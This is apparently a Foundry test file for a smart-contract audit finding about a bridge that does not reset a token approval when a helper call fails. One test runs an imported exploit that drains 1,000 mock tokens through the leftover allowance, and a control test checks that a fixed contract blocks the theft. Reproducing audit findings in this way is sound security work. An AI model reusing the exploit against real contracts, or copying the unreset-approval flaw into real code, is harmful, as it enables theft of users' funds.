// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MockToken,
    BadHelper,
    TransactionManagerFixed,
    Receiver
} from "./25506-h-05-approval-is-not-reset-if-the-call-to-ifulfillhelper-fai.sol";

contract Finding25506Test is Test {
    function test_exploit_leftover_allowance_takes_1000() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.token().balanceOf(e.sink()), 1_000 ether, "1000 taken");
        assertEq(e.token().balanceOf(address(e.bridge())), 0, "bridge empty");
        assertEq(e.token().allowance(address(e.bridge()), address(e.helper())), 0, "allowance spent");
    }

    function test_control_resets_allowance() public {
        MockToken token = new MockToken();
        BadHelper helper = new BadHelper(address(token));
        Receiver user = new Receiver();
        TransactionManagerFixed bridge = new TransactionManagerFixed(address(token), address(user));
        token.mint(address(bridge), 1_000 ether);

        bridge.fulfill(address(helper), address(user), keccak256("tx"), 1_000 ether);

        assertEq(token.allowance(address(bridge), address(helper)), 0, "reset");
        assertEq(token.balanceOf(address(user)), 1_000 ether, "user paid");
        token.mint(address(bridge), 1_000 ether);
        vm.expectRevert();
        helper.steal(address(bridge), address(this), 1_000 ether);
        assertEq(token.balanceOf(address(bridge)), 1_000 ether, "later deposit kept");
    }
}
